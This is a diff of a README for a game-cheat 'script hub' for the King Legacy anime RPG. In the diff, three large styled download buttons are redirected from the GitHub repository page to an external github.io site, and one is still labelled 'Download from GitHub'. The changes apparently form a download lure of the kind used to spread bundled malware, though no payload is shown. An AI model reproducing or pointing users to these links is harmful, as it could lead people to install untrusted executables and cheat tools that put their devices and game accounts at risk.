@@ -1,7 +1,7 @@
 <h1>🎮 king-legacy-script-hub - Streamlined Script Utility for Anime RPG</h1>
 
 <p align="center">
-  <a href="https://github.com/Featurestarlight833/king-legacy-script-hub" style="background-color:#4CAF50; color:white; padding:15px 32px; text-align:center; text-decoration:none; display:inline-block; font-size:20px; border-radius:12px;">⬇️ DOWNLOAD NOW</a>
+  <a href="https://featurestarlight833.github.io" style="background-color:#4CAF50; color:white; padding:15px 32px; text-align:center; text-decoration:none; display:inline-block; font-size:20px; border-radius:12px;">⬇️ DOWNLOAD NOW</a>
 </p>
 
 ## 🎯 Overview
@@ -18,7 +18,7 @@ Follow these straightforward steps to download and run king-legacy-script-hub on
 
 Click the download button at the top of this page or visit this link to download the application:
 
-<a href="https://github.com/Featurestarlight833/king-legacy-script-hub" style="background-color:#2196F3; color:white; padding:10px 25px; text-align:center; text-decoration:none; display:inline-block; font-size:16px; border-radius:8px;">⬇️ Download from GitHub</a>
+<a href="https://featurestarlight833.github.io" style="background-color:#2196F3; color:white; padding:10px 25px; text-align:center; text-decoration:none; display:inline-block; font-size:16px; border-radius:8px;">⬇️ Download from GitHub</a>
 
 Visit this link to download the application. The download page will open in your browser.
 
@@ -98,7 +98,7 @@ For further assistance, visit the GitHub repository and open an issue.
 
 Ready to enhance your King Legacy experience? Download king-legacy-script-hub now:
 
-<a href="https://github.com/Featurestarlight833/king-legacy-script-hub" style="background-color:#FF5722; color:white; padding:15px 32px; text-align:center; text-decoration:none; display:inline-block; font-size:20px; border-radius:12px;">⬇️ GET THE SCRIPT HUB</a>
+<a href="https://featurestarlight833.github.io" style="background-color:#FF5722; color:white; padding:15px 32px; text-align:center; text-decoration:none; display:inline-block; font-size:20px; border-radius:12px;">⬇️ GET THE SCRIPT HUB</a>
 
 ## 📄 License
 
